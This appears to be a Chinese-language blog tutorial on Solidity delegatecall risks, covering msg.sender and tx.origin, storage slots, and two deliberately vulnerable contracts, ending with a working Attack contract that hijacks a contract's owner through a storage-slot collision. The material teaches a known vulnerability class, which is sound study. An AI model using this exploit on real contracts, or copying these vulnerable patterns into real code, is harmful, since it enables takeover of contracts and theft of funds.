#  delegatecall的风险

在学习delegatecall之前，我们先简单了解交易中的一些基础的参数：

##  0. `msg.sender`与`tx.origin`

我们假设有这样一个链条：用户A→合约B→合约C，就是用户A创建了一个合约B，而合约B会调用合约C中的某些函数

假如此时合约B调用了合约C的某个函数，那么此时合约C中的msg.sender就是B的地址，因为是B**直接调用**了C的功能；tx.origin是调用了智能合约功能的**用户地址**，所以这里合约C的tx.origin则是A的地址

可以这样简单理解：一整个链条是一次交易（Transaction, tx），交易的源头自然是交易的发起者，所以`tx.origin`是整个交易的根节点，这里就是用户A；而交易中会进行多次信息（Message, msg）的传输，比如A到B，B到C，而每次信息的发送者就是`msg.sender`

##  1. 什么是delegatecall

常规的`call`是正常的调用，也就是假如A call B，那么会使用B的各种变量执行B的代码，而`delegatecall`则有一点点不同：假如A delegatecall B，那么B的代码仍旧会被执行，但是使用的各种变量来自于A，两个字形容的话就是夺舍

假如我们现在的链条变成了这样：

> 用户A→合约B→(delegatecall)→合约C

这里合约C中的`msg.sender`其实是A的地址，同时`msg.value`来源也是A，因为是合约B委托了合约C，所以C执行用的是B的数据

晕了？说白了就是将合约C的代码逻辑替换到合约B上了，调用完成之后再换回来

##  2. 偷天换日——delegatecall的风险

假如我们有这样一个合约：

```solidity
contract Hackme{
	address public owner;
	Lib public lib;
	
	constructor(Lib _lib) public{
		owner = msg.sender;
		lib = Lib(_lib);
	}
	
	fallback() external payable{
		address(lib).delegatecall(msg.data);
	}
}

contract Lib{
	address public owner;
	
	function pwn() public{
		owner = msg.sender;
	}
}
```

我们的目的是把Hackme合约中的owner抢过来，但是Hackme合约中有关owner赋值的只有构造函数里面那一句，我们只能和合约中的`fallback()`进行交互，而fallback会把我们的`msg.data`传输到Lib合约中运行

当智能合约**被调用了一个无法正确匹配到的函数**，或者合约在未被提供数据的时候被外部转入ETH的时候，`fallback()`内的语句会被执行，所以我们可以通过**调用一个Hackme里面没有的函数**来让它执行fallback内语句

不仅如此，之后把msg.data传输到Lib合约运行的时候，我们可以**构造msg.data，使得我们能够执行Lib合约内我们想执行的任何一个函数**，而在这里我们想执行的是Lib中的`pwn()`

但是为什么是`pwn()`？还记得delegatecall的定义吗？其实Lib的`pwn()`会在Hackme的上下文中运行，导致执行`pwn()`的时候，**被操作的其实是Hackme内存中的owner**，从而使Hackme易主

##  2.5 `storage`，`memory`和`calldata`

我们先说memory和calldata：Memory，内存，一个存储临时数据的位置；Calldata，很明显是call产生的data，那么这个数据也很明显是临时的，也就是说calldata它也是一个存储临时数据的位置

两者的区分在于存储的数据是不一样的，memory存储的是**在函数执行的时候会使用到的变量**，可能是函数参数、局部变量之类的东西，而calldata存储的是**外部调用者传进函数的参数**

但是有一个问题：**memory是可读可写的，但是calldata只可读**，所以如果我们需要在函数执行的时候修改一个存放在calldata中的函数参数，那么我们需要先将这个参数复制到memory中再对memory的参数进行修改操作，比如下面的例子：

```solidity
function addOne(uint[] calldata numbers) public pure returns (uint[] memory) {
  uint[] memory newNumbers = new uint[](numbers.length);
  for (uint i = 0; i < numbers.length; i++) {
    newNumbers[i] = numbers[i] + 1;
  }
  return newNumbers;
}
```

因为我们需要修改numbers中的数据，所以我们需要先将numbers复制到memory中的newNumbers里再修改

刚刚我们提到的都是存储临时数据的位置，那么相对的我们需要一个**永久存放数据的位置**，而这就是存储：storage，它里面的数据能被合约中的任意函数访问并修改

在Solidity中，一个合约的存储空间会被分成$2^{256}$个32字节的存储槽，这些槽可以简单理解成一个数组，其索引从0开始，且所有存储槽一开始都会被初始化为0，各种数据类型的存储可以看这篇文章进行了解：[What is Smart Contract Storage Layout? (alchemy.com)](https://docs.alchemy.com/docs/smart-contract-storage-layout)

##  3. 一人千面——跨数据类型的变量更改

假如我们有下面两个合约：

```solidity
contract Lib{
	uint public someNumber;
	
	function doSomething(uint _num) public{
		someNumber = _num;
	}
}

contract HackMe{
	address public lib;
	address public owner;
	uint public someNumber;
	
	constructor(address _lib) public{
		lib = _lib;
		owner = msg.sender;
	} 
	
	function doSomething(uint _num) public{
		lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
	}
}
```

很明显，我们的HackMe合约是想调用Lib合约中的doSomething来修改自己合约中的someNumber状态变量的，但是！我们发现有个问题：Lib的storageSlot 0（之后会以storageSlot x的格式表示第几位存储槽）对应的是someNumber，而HackMe的storageSlot 0对应的则是Lib合约的地址！

再回想delegatecall的定义：在委托合约的上下文运行被委托合约，所以我们委托调用Lib的doSomething的时候，看起来是修改了someNumber变量的值，但是**实际上是修改了storageSlot 0上的数据**，也就是HackMe合约中的lib地址！

所以攻击思路就很显然了：我们先修改lib地址，使得HackMe合约委托调用我们自己的一个攻击合约，然后我们再构造一个doSomething函数，进行下一步的攻击，比如说继续利用delegatecall的定义和性质，修改HackMe合约的storageSlot 1上的值，也就是修改owner！

不过由于这里的doSomething的参数是个uint，而最后修改的是个address，所以我们攻击的时候需要将想传入的address转换为uint

于是我们可以编写下面的攻击合约：

```solidity
contract Attack{
	address public lib;
	address public owner;
	uint public someNumber;
	
	HackMe public hackMe;
	
	constructor(HackMe _hackMe) public{
		hackMe = HackMe(_hackMe);
	}
	
	function attack() public{
		hackMe.doSomething(uint(address(this)));
		hackMe.doSomething(1);
	}
	
	function doSomething(uint _num) public{
		owner = msg.sender;
	}
}
```

详细拆解一下：首先我们复制粘贴HackMe合约中的状态变量排布，方便我们进行攻击合约的编写，至于第6行的hackMe变量无需担心，因为它在storageSlot 3，HackMe合约无权访问

`attack()`函数首先会修改HackMe中的lib地址为这个攻击合约的地址，然后执行的doSomething会委托调用我们攻击合约的doSomething

攻击合约里面，我们想要让owner变成我们的合约地址，先写成owner = this contract

然后我们根据delegatecall的性质写出第二次执行doSomething的链条：

合约Attack→合约HackMe→(delegatecall)→合约Attack

所以我们会发现这里的`msg.sender`就是合约Attack的地址，所以我们的this contract就可以被改写为`msg.sender`

> 是的，我懒了，直接抄我博客了，就这样吧www，没搞懂可以Solidity by Example或者做Ethernaut